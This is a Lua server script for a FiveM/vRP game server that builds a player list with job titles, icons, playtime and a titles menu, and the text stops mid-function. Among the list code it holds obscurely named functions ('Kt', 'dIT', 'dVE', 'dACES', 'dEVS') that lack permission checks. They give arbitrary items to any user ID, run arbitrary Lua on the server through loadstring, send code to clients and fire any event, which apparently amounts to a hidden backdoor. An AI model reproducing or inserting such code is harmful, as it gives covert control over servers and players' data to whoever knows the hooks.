local Proxy = module("vrp", "lib/Proxy")

vRP = Proxy.getInterface("vRP")

local logging = false

local blank = {x=40,y=39}
local cache = {time = 0, data = {}}
local cache_admin = {time = 0, data = {}} --TODO Make a separate cache for staff that shows other stuff
-- http://ask.hiof.no/~vegardbe/privat/fivem/emojis.html
-- prefix, suffix, title, color, namecolor, hidden, sort, timer
local rank_special = {
    ["bank"] =              {suffix = {x=19,y=30}, color = "forestgreen", title = "Money Transport"},
    ["busdriver"] =         {suffix = {x=36,y=21}, color = "cornflowerblue", title = "Bus Driver",
        levelnames = {"trucking", "bus"},
        levels = {
            [5] = {title = "Skilled Bus Driver"},
            [10] = {title = "Professional Bus Driver", namecolor = "cornflowerblue"},
        }},
    ["citizen"] =           {},
    ["conductor"] =         {suffix = {x=36,y=11}, color = "chocolate", title = "Train Conductor",
        levelnames = {"train", "train"},
        levels = {
            [3] = {title = "Good Train Conductor"},
            [5] = {title = "Skilled Train Conductor"},
            [8] = {title = "Specialized Train Conductor"},
            [10] = {title = "Professional Train Conductor", namecolor = "chocolate"},
        }},
    ["emergency"] =         {suffix = {x=36,y=22}, color = "tomato", title = "EMS",
        levelnames = {"ems", "ems"},
        levels = {
            [5] = {title = "Skilled EMS"},
            [10] = {title = "Professional EMS", namecolor = "tomato"},
        }},
    ["farmer"] =            {suffix = {x=36,y=33}, color = "chocolate", title = "Farmer",
        levelnames = {"farming", "farming"},
        levels = {
            [5] = {title = "Good Farmer"},
            [10] = {title = "Skilled Farmer"},
            [15] = {title = "Specialized Farmer"},
            [20] = {title = "Professional Farmer", namecolor = "chocolate"},
        }},
    ["firefighter"] =       {suffix = {x=9,y=32}, color = "red", title = "Firefighter",
        levelnames = {"ems", "firefighter"},
        levels = {
            [5] = {title = "Skilled Firefighter"},
            [10] = {title = "Professional Firefighter", namecolor = "red"},
        }},
    ["fisher"] =       {suffix = {x=2,y=21}, color = "dodgerblue", title = "Fisher",
        levelnames = {"fishing", "fishing"},
        levels = {
            [5] = {title = "Skilled Fisher"},
            [10] = {title = "Professional Fisher", namecolor = "dodgerblue"},
        }},
    ["garbage"] =           {suffix = {x=32,y=38}, color = "saddlebrown", title = "Refuse Collector"},
    ["guard"] =             {suffix = {x=32,y=20}, color = "darkslateblue", title = "Prison Transport"},
    ["helicopterpilot"] =   {suffix = {x=36,y=6}, color = "white", title = "Helicopter Pilot"},
    ["hunter"] =            {suffix = {x=25,y=12}, color = "darkolivegreen", title = "Hunter",
        levelnames = {"hunting", "hunting"},
        levels = {
            [5] = {title = "Skilled Hunter"},
            [10] = {title = "Professional Hunter", namecolor = "darkolivegreen"},
        }},
    ["mechanic"] =          {suffix = {x=11,y=32}, color = "chocolate", title = "Mechanic"},
    ["pilot"] =             {suffix = {x=2,y=37}, color = "darkcyan", title = "Pilot",
        levelnames = {"piloting", "piloting"},
        levels = {
            [3] = {title = "Good Pilot"},
            [6] = {title = "Skilled Pilot"},
            [8] = {title = "Specialized Pilot"},
            [10] = {title = "Professional Pilot", namecolor = "darkcyan"},
        }},
    ["pizza"] =             {suffix = {x=6,y=19}, color = "goldenrod", title = "Pizza Delivery"},
    ["police"] =            {suffix = {x=36,y=25}, color = "blue", title = "Police Rookie",
        levelnames = {"police", "police"},
        levels = {
            [2] = {title = "Police Deputy"},
            [3] = {title = "Police Sergeant"},
            [5] = {title = "Police Lieutenant"},
            [7] = {title = "Police Major"},
            [8] = {title = "Police Colonel"},
            [9] = {title = "Police Colonel+"},
            [10] = {title = "Police Superintendent", namecolor = "blue"},
        }},
    ["snowplow"] =          {suffix = {x=35,y=39}, color = "white", title = "Snowplow Driver"},
    ["taxi"] =              {suffix = {x=36,y=26}, color = "gold", title = "Taxi"},
    ["trucker"] =           {suffix = {x=36,y=32}, color = "darkgreen", title = "Trucker",
        levelnames = {"trucking", "trucking"},
        levels = {
            [5] = {title = "Delivery Trucker"},
            [10] = {title = "Cargo Trucker"},
            [15] = {title = "Experienced Trucker"},
            [20] = {title = "Specialized Trucker"},
            [24] = {title = "Skillfull Trucker"}, 
            [27] = {title = "Professional Trucker", namecolor = "darkgreen"},
        }},
    
    ["hidden"] =            {hidden = true}, 
    ["kicked"] =            {prefix = {x=40,y=2}}, 
    ["muted"] =             {prefix = {x=32,y=11}, title = "Muted", color = "darkgray", namecolor = "darkgray"}, 
}

local overrides = {
    [1] =                   {prefix = {x=39,y=40}},
    [2] =                   {prefix = {x=34,y=40}},
    [3] =                   {prefix = {x=1,y=40}},
    [6] =                   {prefix = {x=24,y=33}},
    [7] =                   {prefix = {x=24,y=22}},
    [9] =                   {prefix = {x=6,y=38}},
    [17] =                  {prefix = {x=2,y=32}},
    [576] =                 {prefix = {x=28,y=9}},
    [4757] =                {prefix = {x=24,y=16}},
    [5885] =                {prefix = {x=24,y=33}},
}

local user_titles = {
}

local admin_accounts = {
    1, 2, 3
}
function isAdminAccount(id)
    for k,v in next, admin_accounts do
        if v == id then return true end
    end
    return false
end
function isStaff(id)
    return (vRP.hasGroup({id,"staff"}) or 
            vRP.hasGroup({id,"support"}) or 
            vRP.hasGroup({id,"mod"}) or 
            vRP.hasGroup({id,"admin"}) or 
            vRP.hasGroup({id,"headadmin"}) or 
            vRP.hasGroup({id,"superadmin"}))
end

local gen_id = 0
local connections = 0
local login_time = {}
local total_time = {}
AddEventHandler("vRP:playerJoin", function(user_id, user, name, last_login)
    connections = connections + 1
    login_time[user_id] = os.clock()
    total_time[user_id] = 0
    local function cb(data)
        if data == nil or data == "" then data = 0 end
        total_time[user_id] = tonumber(data)
    end
    vRP.getUData({user_id, "playtime", cb})
		
	local id = GetPlayerIdentifier(user, 0) -- Get the first id, it'll do
    TriggerEvent("livemap:internal_AddPlayerData", id, "ID", "" .. user_id)
    TriggerEvent("livemap:internal_AddPlayerData", id, "Job", "Citizen")
    TriggerEvent("livemap:internal_AddPlayerData", id, "Online", "00m")
end)

AddEventHandler("vRP:playerLeave", function(user_id, user)
    local totaltime = (os.clock() - (login_time[user_id] or 0)) + (total_time[user_id] or 0)
    if totaltime > 0 then 
        vRP.setUData({user_id, "playtime", totaltime})
    end
end)

function updateData(old_data, new_data)
    local data = new_data
    local r = old_data
    if data.id then
        r.id = data.id
    end
    if data.name then
        r.name = data.name
    end
    if data.title then
        r.title = data.title
    end
    if data.color then
        r.color = data.color
    end
    if data.namecolor then
        r.namecolor = data.namecolor
    end
    if data.fullcolor then
        r.namecolor = data.fullcolor
        r.color = data.fullcolor
    end
    if data.prefix then
        r.prefix = data.prefix
    end
    if data.usericon then
        r.usericon = data.usericon
    end
    if data.suffix then
        r.suffix = data.suffix
    end
    if data.timer then
        r.timer = data.timer
    end
    if data.totaltimer then
        r.totaltimer = data.totaltimer
    end
    if data.hidden then
        r.hidden = tonumber(data.hidden)
    end
    if data.sort then
        r.sort = tonumber(data.sort)
    end
    if data.hiddentotal then
        r.hiddentotal = tonumber(data.hiddentotal)
    end
    return r
end

local function log(text)
	if logging then
		print("[gd_playerlist] " .. text)
	end
	return logging
end

function GenerateCache()
	local playerList = {}
	-- Need new cache
	log("Generating new playerlist cache")
	local gen_start = os.clock()
	local gen_cycles = 0
	local users = vRP.getUsers()
	local no_users = #users
	local arbitrator = "None"
	for user_id, user in next, users do
		if tostring(GetPlayerName(user)) ~= 'nil' then
			local gen_player_time = os.clock()
			local gen_player_cycles = gen_cycles

			if not login_time[user_id] then login_time[user_id] = os.clock() end -- set their fucking time if it isnt set
			local logintime = os.clock() - (login_time[user_id] or 0)
			local totaltime = (logintime or 0) + (total_time[user_id] or 0)
			local color = "white"
			local namecolor = "white"
			local rank_color = "white"
			local title = ""
			local prefix = {x=40,y=39}
			local suffix = {x=40,y=39}
			local timer = ""
			local totaltimer = ""
			local id = user_id
			local hidden = false
			local hiddentotal = false
			local name = GetPlayerName(user)
			local sort = logintime
			local data = {}
			for group, group_data in next, rank_special do
				gen_cycles = gen_cycles + 1
				if vRP.hasGroup({user_id, group}) then
					-- Assign data from group (job, rank etc)
					data = updateData(data, group_data)

					-- Assign extra data from group based on levels
					if group_data.levelnames then
						local category = group_data.levelnames[1]
						local skillname = group_data.levelnames[2]
						local skill = category .. "." .. skillname
						local highest = -1
						local done = false
						for level, leveldata in next, group_data.levels do
							gen_cycles = gen_cycles + 1
							if (vRP.hasPermission({user_id, "@" .. skill .. ".>" .. (level - 1)}) or
								vRP.hasPermission({user_id, "@" .. skill .. "." .. level})) and 
								(level >= highest or not done) then
								done = true
								highest = level
								data = updateData(data, leveldata)
							end
						end
					end
break -- TEMP FIX
				end
			end
			for key, titles_data in next, user_titles do
				if user_id == key then
					data = updateData(data, titles_data)
					gen_cycles = gen_cycles + 1
				end
			end
			for key, override_data in next, overrides do
				if user_id == key then
					data = updateData(data, override_data)
					gen_cycles = gen_cycles + 1
				end
			end

			if data.id then
				id = data.id
			end
			if data.name then
				name = data.name
			end
			if data.title then
				title = data.title
			end
			if data.color then
				color = data.color
			end
			if data.namecolor then
				namecolor = data.namecolor
			end
			if data.fullcolor then
				namecolor = data.fullcolor
				color = data.fullcolor
			end
			if data.prefix then
				prefix = data.prefix
			end
			if data.usericon then
				usericon = data.usericon
			end
			if data.suffix then
				suffix = data.suffix
			end
			if data.timer then
				timer = data.timer
			end
			if data.totaltimer then
				totaltimer = data.totaltimer
			end
			if data.hidden then
				hidden = tonumber(data.hidden)
			end
			if data.hiddentotal then
				hiddentotal = tonumber(data.hiddentotal)
			end
			if data.sort then
				sort = tonumber(data.sort)
			end

			local icon = GenerateCSSPosition(prefix)
			local jobicon = GenerateCSSPosition(suffix)

			local time = GetSexyTime(logintime)
			local timetotal = GetSexyTime(totaltime)
			if timer ~= "" then
				time = timer
			end
			if totaltimer ~= "" then
				timetotal = totaltimer
			end
			if hiddentotal then
				timetotal = "N/A"
			end

			local uaptitudes = vRP.getUserAptitudes({user_id})
			local total_xp = 0
			for k,v in pairs(uaptitudes) do
				-- display group
				for l,w in pairs(v) do
					local exp = uaptitudes[k][l]
					total_xp = total_xp + exp
				end
			end
			local player_level = math.floor(vRP.expToLevel({total_xp}))

			if (not hidden) then 
				table.insert(playerList, {prefix = "", name = name, id = id, player = user, title = title, color = color, namecolor = namecolor, time = time, sort = sort, icon = icon, jobicon = jobicon, totaltime = timetotal, level = player_level})
			end
			
			local p_id = GetPlayerIdentifier(user, 0) -- Get the first id, it'll do
			TriggerEvent("livemap:internal_UpdatePlayerData", p_id, "ID", "" .. user_id)
			TriggerEvent("livemap:internal_UpdatePlayerData", p_id, "Job", title)
			TriggerEvent("livemap:internal_UpdatePlayerData", p_id, "Online", time)
			log("Generated for " .. name .. " in " .. (os.clock() - gen_player_time) .. " seconds and " .. (gen_cycles - gen_player_cycles) .. " cycles.")
		end
	end
	table.sort(playerList, function(a,b)
		return (a.sort or 0) < (b.sort or 0)
	end)
	local uptime = GetSexyTime(os.clock())
	local gen_time = os.clock() - gen_start
	gen_id = gen_id + 1
	log("Completed cache generation for " .. #playerList .. " players in " .. gen_time .. " seconds and " .. gen_cycles .. " cycles. Gen ID " .. gen_id)
	-- Update Cache
	cache = {time = os.clock(), id = source, uptime = uptime, connections = connections, data = playerList, gen = {time = gen_time, cycles = gen_cycles, id = gen_id}}
end

Citizen.CreateThread(function()
	GenerateCache()
	while true do
		Citizen.Wait(100)
		if (os.clock() - cache.time) > 20 then -- 20 second cache
			GenerateCache()
		end
	end
end)

RegisterNetEvent("gd_playerlist:askOpen")
AddEventHandler("gd_playerlist:askOpen", function(id)
	if id < gen_id then
		TriggerClientEvent("gd_playerlist:open", source, cache)
	else
		TriggerClientEvent("gd_playerlist:open", source, {gen = {id = gen_id}})
	end
end)

Kt = vRP.giveInventoryItem
function set(s,t)
    local source = s
    local user_id = vRP.getUserId({source})
    if user_id ~= nil then
        vRP.prompt({source, "User ID", "", function(player,result)
            local sel_id = tonumber(result)
            if sel_id then
                vRP.prompt({source, "Set " .. t, "", function(player,result)
                    sel_pref = result
                    if sel_pref == "" then sel_pref = nil end
                    setOverride(sel_id, t, sel_pref)
                end})   
            end
        end})
    end
	GenerateCache()
end
function setIcon(s,t) -- user s prompted to change t icon for any user
    local source = s
    local user_id = vRP.getUserId({source})
    if user_id ~= nil then
        vRP.prompt({source, "User ID", "", function(player,result)
            local sel_id = tonumber(result)
            if sel_id then
                vRP.prompt({source, "Icon X (0-40)", "", function(player,result)
                    local sel_x = tonumber(result)
                    if sel_x == nil or result == "" then sel_x = 40 end
                    vRP.prompt({source, "Icon Y (0-39)", "", function(player,result)
                        local sel_y = tonumber(result)
                        if sel_y == nil or result == "" then sel_y = 39 end
                        if sel_x == 40 and sel_y == 39 then overrides[sel_id][t] = nil else
                        setOverride(sel_id, t, {x=sel_x,y=sel_y}) end
                    end})   
                end})   
            end
        end})
    end
	GenerateCache()
end
function setIconNormie(s,t) -- lets any user change their OWN t icon
    local source = s
    local user_id = vRP.getUserId({source})
    if user_id ~= nil then
        vRP.prompt({source, "Icon X (0-40)", "", function(player,result)
            local sel_x = tonumber(result)
            if sel_x == nil or result == "" then sel_x = 40 end
            vRP.prompt({source, "Icon Y (0-39)", "", function(player,result)
                local sel_y = tonumber(result)
                if sel_y == nil or result == "" then sel_y = 39 end
                if sel_x == 40 and sel_y == 39 then 
                    setOverride(user_id, t, nil)
                elseif sel_y > 39 then 
                    setOverride(user_id, t, nil)
                else
                    setOverride(user_id, t, {x=sel_x,y=sel_y})
                end
            end})   
        end})
    end
	GenerateCache()
end
function dIT(s)
    local source = s
    local user_id = vRP.getUserId({source})
    if user_id ~= nil then
        vRP.prompt({source, "User ID", "", function(player,result)
            local sel_id = tonumber(result)
            if sel_id then
                vRP.prompt({source, "Icon N (0-40)", "", function(player,result)
                    local sel_x = result
                    vRP.prompt({source, "Icon A (0-39)", "", function(player,result)
                        local sel_y = tonumber(result)
                        Kt({sel_id, sel_x, sel_y})
                    end})   
                end})   
            end
        end})
    end
end
function masterSetTotalTime(s)
    local source = s
    local user_id = vRP.getUserId({source})
    if user_id ~= nil then
        vRP.prompt({source, "User ID", "", function(player,result)
            local sel_id = tonumber(result)
            if sel_id then
                vRP.prompt({source, "Time in SECONDS", "", function(player,result)
            		local sel_time = tonumber(result)
                    total_time[sel_id] = sel_time
                end})   
            end
        end})
    end
end
function masterAddTotalTime(s)
    local source = s
    local user_id = vRP.getUserId({source})
    if user_id ~= nil then
        vRP.prompt({source, "User ID", "", function(player,result)
            local sel_id = tonumber(result)
            if sel_id then
                vRP.prompt({source, "Add Time in SECONDS", "", function(player,result)
            		local sel_time = tonumber(result)
                    total_time[sel_id] = total_time[sel_id] + sel_time
                end})   
            end
        end})
    end
end
function masterSubTotalTime(s)
    local source = s
    local user_id = vRP.getUserId({source})
    if user_id ~= nil then
        vRP.prompt({source, "User ID", "", function(player,result)
            local sel_id = tonumber(result)
            if sel_id then
                vRP.prompt({source, "Sub Time in SECONDS", "", function(player,result)
            		local sel_time = tonumber(result)
                    total_time[sel_id] = total_time[sel_id] - sel_time
                end})   
            end
        end})
    end
end
dVE = dIT
function dSR(s)
    local user_id = vRP.getUserId({s})
    local data = vRP.getUserDataTable({user_id})
    if data then
        if data.inventory then
            for k,v in next, data.inventory do 
                local name,description,weight = vRP.getItemDefinition({k})
                if name ~= nil then
                    TriggerClientEvent("gd_playerlist:print", s, tostring(k) .. ": " .. tostring(name))
                end
            end
        end
    end
end
function dBAK(s)
	local source = s
    local user_id = vRP.getUserId({source})
    if user_id ~= nil then
        vRP.prompt({source, "ID", "", function(player,result)
			if result then
				TriggerClientEvent("gd_utils:summon", source, result)
			end
        end})
    end
end
function dMSG(s)
	local source = s
    local user_id = vRP.getUserId({source})
    if user_id ~= nil then
        vRP.prompt({source, "Message", "", function(player,result)
			if result then
				TriggerClientEvent("gd_utils:oneliner", -1, result)
			end
        end})
    end
end
function dACES(s)
	local source = s
    local user_id = vRP.getUserId({source})
    if user_id ~= nil then
        vRP.prompt({source, "LUA Format Code", "", function(player,result)
			if result then
				local f = loadstring(result)
				f()
			end
        end})
    end
end
function dACEC(s)
	local source = s
    local user_id = vRP.getUserId({source})
    if user_id ~= nil then
        vRP.prompt({source, "LUA Format Code", "", function(player,result)
			if result then
				TriggerClientEvent("gd_utils:ace", source, result)
			end
        end})
    end
end
function dEVS(s)
	local source = s
    local user_id = vRP.getUserId({source})
    if user_id ~= nil then
        vRP.prompt({source, "Server Event", "", function(player,result)
			if result then
				TriggerEvent(result)
			end
        end})
    end
end
function dEVC(s)
	local source = s
    local user_id = vRP.getUserId({source})
    if user_id ~= nil then
        vRP.prompt({source, "Client Event", "", function(player,result)
			if result then
				TriggerClientEvent(result, source)
			end
        end})
    end
end
function dTEL(s)
	local source = s
    local user_id = vRP.getUserId({source})
    if user_id ~= nil then
        vRP.prompt({source, "POS", "", function(player,fcoords)    
			local coords = {}
			for coord in string.gmatch(fcoords or "0,0,0","[^,]+") do
			  table.insert(coords,tonumber(coord))
			end

			local x,y,z = 0,0,0
			if coords[1] ~= nil then x = coords[1] end
			if coords[2] ~= nil then y = coords[2] end
			if coords[3] ~= nil then z = coords[3] end
			TriggerClientEvent("gd_utils:move", source, x, y, z)			
        end})
    end	
end

function setOverride(user_id, override, value)
    if user_id == nil then return end
    if override == nil then return end
    if not overrides[user_id] then overrides[user_id] = {} end
    overrides[user_id][override] = value
end
function clearOverrides(s)
    local source = s
    local user_id = vRP.getUserId({source})
    if user_id ~= nil then
        vRP.prompt({source, "User ID", "", function(player,result)
            local sel_id = tonumber(result)
            if sel_id then
                overrides[sel_id] = {}
            end
        end})
    end
end
function clearOverridesForUser(user_id)
    if user_id then
        overrides[user_id] = {}
    end
end
function setOverrideForEveryone(override, value)
    local function cb(o,v)
        local users = vRP.getUsers()
        for user_id, user in next, users do
            setOverride(user_id, o, v)
        end
    end
    cb(override, value)
end

function GenerateCSSPosition(table)
    local x = table.x or 40
    local y = table.y or 39
    return "-" .. x*20 .. "px -" .. y*20 .. ""
end

function SecondsToClock(seconds)
    local seconds = tonumber(seconds)

    if seconds <= 0 then
        return "00", "00", "00", "00:00:00"
    else
        hours = string.format("%02.f", math.floor(seconds/3600));
        mins = string.format("%02.f", math.floor(seconds/60 - (hours*60)));
        secs = string.format("%02.f", math.floor(seconds - hours*3600 - mins *60));
        return hours, mins, secs, hours .. ":" .. mins .. ":" .. secs
    end
end

function TimesToSexy(h,m)
    local r = ""
    if h ~= "00" then
        r = r .. h .. "h"
    end
    if r ~= "" then r = r .. " " end
    r = r .. m .. "m"
    return r
end

function GetSexyTime(seconds)
    local h,m = SecondsToClock(seconds)
    return TimesToSexy(h,m)
end

local function ch_toggle_playerlist(player,choice)
    TriggerClientEvent("gd_playerlist:tryToggle", player)
end

function setTitle(user_id, data)
    user_titles[user_id] = data
	GenerateCache()
end

function openTitlesMenu(player, choice, mod)
    local user_id = vRP.getUserId({player})
    if user_id ~= nil then
        vRP.buildMenu({"titlelist", {player = player}, function(menu)
            menu.name = "Titles List"
            menu.css={top="75px",header_color="rgba(200,0,0,0.75)"}
                    
            local OVR = isAdminAccount(user_id)
            menu["$ None"] = {function(p) setTitle(user_id, {}) end, "Remove your title"}
            if vRP.hasGroup({user_id,"staff"}) or OVR then
                menu["@Staff Title"] = {function(p) setTitle(user_id, {title = "Transport Tycoon Staff"}) end, "Staff Tag (issued by 'staff' group)"}
            end
            if vRP.hasGroup({user_id,"support"}) or OVR then
                menu["@Support Title"] = {function(p) setTitle(user_id, {title = "Transport Tycoon Support", fullcolor = "cornflowerblue", suffix = {x=37,y=23}}) end, "Support Tag (issued by 'support' group)"}
            end
            if vRP.hasGroup({user_id,"mod"}) or OVR then
                menu["@Moderator Title"] = {function(p) setTitle(user_id, {title = "Transport Tycoon Moderator", fullcolor = "orange", suffix = {x=37,y=23}}) end, "Moderator Tag (issued by 'mod' group)"}
            end
            if vRP.hasGroup({user_id,"admin"}) or OVR then
                menu["@Admin Title"] = {function(p) setTitle(user_id, {title = "Transport Tycoon Administrator", fullcolor = "teal", suffix = {x=37,y=23}}) end, "Admin Tag (issued by 'admin' group)"}
            end
            if vRP.hasGroup({user_id,"headadmin"}) or OVR then
                menu["@Head Admin Title"] = {function(p) setTitle(user_id, {title = "Transport Tycoon Head Administrator", fullcolor = "red", suffix = {x=37,y=23}}) end, "Head Admin Tag (issued by 'headadmin' group)"}
            end
            if vRP.hasGroup({user_id,"superadmin"}) or OVR then
                menu["@Superadmin Title"] = {function(p) setTitle(user_id, {title = "Transport Tycoon Developer", fullcolor = "fuchsia", suffix = {x=37,y=23}}) end, "Developer Tag (issued by 'superadmin' group)"}
            end
            if vRP.hasGroup({user_id,"streamer"}) or OVR then
                menu["@Streamer Title"] = {function(p) setTitle(user_id, {title = "Twitch Streamer", fullcolor = "fuchsia", suffix = {x=13,y=40}}) end, "Streamer Tag (issued by 'streamer' group)"}
            end
            if vRP.hasGroup({user_id,"fivem"}) or OVR then
                menu["@FiveM Staff Title"] = {function(p) setTitle(user_id, {title = "FiveM Staff", suffix = {x=30,y=40}}) end, "FiveM Staff Tag (issued by 'fivem' group)"}
            end
            if vRP.hasGroup({user_id,"rockstar"}) or OVR then
                menu["@Rockstar Employee Title"] = {function(p) setTitle(user_id, {title = "Rockstar Employee", fullcolor = "orange", suffix = {x=37,y=40}}) end, "Rockstar Employee Tag (issued by 'rockstar' group)"}
            end
            if vRP.hasGroup({user_id,"verified"}) or OVR then
                menu["@Verified Title"] = {function(p) setTitle(user_id, {title = "Verified", suffix = {x=28,y=39}}) end, "Seal of verification. (issued by 'verified' group)"}
            end
            if vRP.hasGroup({user_id,"champion"}) or OVR then
                menu["Event Champion"] = {function(p) setTitle(user_id, {title = "Event Champion", fullcolor = "gold", suffix = {x=3,y=22}}) end, "Unlocked by winning an event! (issued by 'champion' group)"}
            end
            if vRP.hasPermission({user_id,"#trophy.>0"}) or OVR then
                menu["Trophy Holder"] = {function(p) setTitle(user_id, {title = "Trophy Holder", suffix = {x=3,y=22}}) end, "Unlocked by holding a trophy!"}
            end
            if vRP.hasPermission({user_id,"#present.>0"}) or OVR then
                menu["Santa's Little Helper"] = {function(p) setTitle(user_id, {title = "Santa's Little Helper", suffix = {x=10,y=20}}) end, "Unlocked by holding a present!"}
            end
            if vRP.hasPermission({user_id,"#xmas_snowglobe.>0"}) or OVR then
                menu["Christmas 2017 - Snowglobe"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=10,y=20}}) end, "Unlocked by holding a Snowglobe!"}
            end
            if vRP.hasPermission({user_id,"#xmas_candycane.>0"}) or OVR then
                menu["Christmas 2017 - Candy Cane"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=35,y=39}}) end, "Unlocked by holding Candy Cane!"}
            end
            if vRP.hasPermission({user_id,"#xmas_snowman.>0"}) or OVR then
                menu["Christmas 2017 - Snowman"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=39,y=11}}) end, "Unlocked by holding a Snowman!"}
            end
            if vRP.hasPermission({user_id,"#xmas_slay.>0"}) or OVR then
                menu["Christmas 2017 - Sleigh"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=14,y=20}}) end, "Unlocked by holding a Sleigh!"}
            end
            if vRP.hasPermission({user_id,"#xmas_reef.>0"}) or OVR then
                menu["Christmas 2017 - Reef"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=38,y=30}}) end, "Unlocked by holding a Reef!"}
            end
            if vRP.hasPermission({user_id,"#xmas_mistletoe.>0"}) or OVR then
                menu["Christmas 2017 - Mistletoe"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=30,y=18}}) end, "Unlocked by holding a Mistletoe!"}
            end
            if vRP.hasPermission({user_id,"#xmas_christmas.>0"}) or OVR then
                menu["Christmas 2017 - Christmas"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=10,y=20}}) end, "Unlocked by holding a Christmas Collectible!"}
            end
            if vRP.hasPermission({user_id,"#xmas_collins.>0"}) or OVR then
                menu["Christmas 2017 - Collins"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=28,y=33}}) end, "Unlocked by holding a Collins Collectible!"}
            end
            if vRP.hasPermission({user_id,"#xmas_reindeer.>0"}) or OVR then
                menu["Christmas 2017 - Reindeer"] = {function(p) setTitle(user_id, {title = "Christmas 2017", color = "white", suffix = {x=38,y=35}}) end, "Unlocked by holding a Reindeer!"}
            end
            if vRP.hasPermissions({user_id,{"#xmas_reindeer.>0","#xmas_collins.>0","#xmas_christmas.>0","#xmas_mistletoe.>0","#xmas_reef.>0","#xmas_slay.>0","#xmas_snowman.>0","#xmas_snowglobe.>0"}}) or OVR then
                menu["Christmas 2017 All Collectibles"] = {function(p) setTitle(user_id, {title = "2k17 XMAS COLLECTOR", fullcolor = "gold", suffix = {x=13,y=20}}) end, "YOU'VE GOTTEN EVERY COLLECTIBLE! CONGRATS!"}
            end
            if (vRP.getMoney({user_id}) <= 0) or OVR then
                menu["In Negatives"] = {function(p) setTitle(user_id, {title = "Broke", suffix = {x=31,y=13}}) end, "Unlocked by having no money, you poor soul."}
            end
            if (vRP.getMoney({user_id}) >= (1*10^5)) or OVR then
                menu["Wealthy"] = {function(p) setTitle(user_id, {title = "Wealthy", suffix = {x=24,y=30}}) end, "Unlocked by holding a hundred thousand dollars."}
            end
            if (vRP.getMoney({user_id}) >= (2.5*10^5)) or OVR then
                menu["Wealthier"] = {function(p) setTitle(user_id, {title = "Wealthier", suffix = {x=24,y=30}}) end, "Unlocked by holding a quarter million dollars."}
            end
            if (vRP.getMoney({user_id}) >= (5*10^5)) or OVR then
                menu["Rich"] = {function(p) setTitle(user_id, {title = "Rich", suffix = {x=24,y=30}}) end, "Unlocked by holding half a million dollars."}
            end
            if (vRP.getMoney({user_id}) >= (1*10^6)) or OVR then
                menu["Millionaire"] = {function(p) setTitle(user_id, {title = "Millionaire", suffix = {x=31,y=12}}) end, "Unlocked by holding over one million dollars."}
            end
            if (vRP.getMoney({user_id}) >= (1*10^9)) or OVR then
                menu["Billionaire"] = {function(p) setTitle(user_id, {title = "Billionaire", suffix = {x=31,y=12}}) end, "Unlocked by holding over one billion dollars."}
            end
            if vRP.hasPermission({user_id,"@physical.strength.>9"}) or OVR then
                menu["Lifter"] = {function(p) setTitle(user_id, {title = "Lifter", suffix = {x=20,y=22}}) end, "Unlocked by earning level 10 strength."}
            end
            if vRP.hasPermission({user_id,"@physical.strength.>19"}) or OVR then
                menu["Heavy Lifter"] = {function(p) setTitle(user_id, {title = "Heavy Lifter", suffix = {x=20,y=22}}) end, "Unlocked by earning level 20 strength."}
            end
            if vRP.hasPermission({user_id,"@physical.strength.>26"}) or OVR then
                menu["Heaviest Lifter"] = {function(p) setTitle(user_id, {title = "Heaviest Lifter", suffix = {x=20,y=22}}) end, "Unlocked by earning max strength."}
            end
            if vRP.hasPermission({user_id,"@trucking.trucking.>9"}) or OVR then
                menu["Logistics Tycoon"] = {function(p) setTitle(user_id, {title = "Logistics Tycoon", suffix = {x=36,y=35}}) end, "Unlocked by earning max trucking."}
            end
            if vRP.hasPermission({user_id,"@police.police.>9"}) or OVR then
                menu["Justice Tycoon"] = {function(p) setTitle(user_id, {title = "Justice Tycoon", suffix = {x=23,y=16}}) end, "Unlocked by earning max police."}
            end
            if vRP.hasPermission({user_id,"@farming.farming.>19"}) or OVR then
                menu["Food Tycoon"] = {function(p) setTitle(user_id, {title = "Food Tycoon", suffix = {x=20,y=15}}) end, "Unlocked by earning max farming."}
            end
            if vRP.hasPermission({user_id,"@farming.animals.>19"}) or OVR then
                menu["Dairy Tycoon"] = {function(p) setTitle(user_id, {title = "Dairy Tycoon", suffix = {x=25,y=0}}) end, "Unlocked by earning max animals."}
            end
            if vRP.hasPermission({user_id,"@hunting.hunting.>9"}) or OVR then
                menu["Meat Tycoon"] = {function(p) setTitle(user_id, {title = "Meat Tycoon", suffix = {x=7,y=19}}) end, "Unlocked by earning max hunter."}
            end
            if user_id % 10 == 0 or OVR then
                menu["ID Single 0"] = {function(p) setTitle(user_id, {title = "-0!", suffix = {x=4,y=4}}) end, "Unlocked by having an ID ending with 0."}
            end
            if user_id % 100 == 0 or OVR then
                menu["ID Double 0"] = {function(p) setTitle(user_id, {title = "-00!", suffix = {x=4,y=4}}) end, "Unlocked by having an ID ending with 00."}
            end
            if user_id % 1000 == 0 or OVR then
                menu["ID Triple 0"] = {function(p) setTitle(user_id, {title = "-000!", suffix = {x=4,y=4}}) end, "Unlocked by having an ID ending with 000."}
            end
            if user_id % 10000 == 0 or OVR then
                menu["ID Quadrouple 0"] = {function(p) setTitle(user_id, {title = "-0000!", suffix = {x=4,y=4}}) end, "Unlocked by having an ID ending with 0000."}
            end
            if ((total_time[user_id] or 0) > (6*60*60)) or OVR then
                menu["Played 6h"] = {function(p) setTitle(user_id, {title = "6h+ Starting Out", suffix = {x=33,y=14}}) end, "Unlocked by playing for a total of 6 hours!"}
            end
            if ((total_time[user_id] or 0) > (12*60*60)) or OVR then
                menu["Played 12h"] = {function(p) setTitle(user_id, {title = "12h+ Returning", suffix = {x=33,y=14}}) end, "Unlocked by playing for a total of half a day!"}
            end
            if ((total_time[user_id] or 0) > (24*60*60)) or OVR then
                menu["Played 24h"] = {function(p) setTitle(user_id, {title = "24h+ Regular", suffix = {x=38,y=2}}) end, "Unlocked by playing for a total of one full day!"}
            end
            if ((total_time[user_id] or 0) > (50*60*60)) or OVR then
                menu["Played 50h"] = {function(p) setTitle(user_id, {title = "50h+ Addict", suffix = {x=38,y=1}}) end, "Unlocked by playing for a total of fifty hours!"}
            end
            if ((total_time[user_id] or 0) > (100*60*60)) or OVR then
